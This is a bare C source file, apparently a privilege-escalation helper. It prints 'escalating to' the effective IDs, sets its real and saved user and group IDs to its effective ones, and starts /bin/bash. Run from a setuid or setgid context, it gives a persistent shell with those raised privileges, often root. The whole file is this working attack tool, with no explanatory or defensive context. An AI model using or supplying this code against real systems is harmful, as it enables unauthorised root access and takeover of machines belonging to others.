#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv) {
        gid_t gid;
        uid_t uid;

        gid = getegid();
        uid = geteuid();

        printf("escalating to %d:%d\n", uid, gid);

        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);

        execve("/bin/bash", NULL, NULL);
}
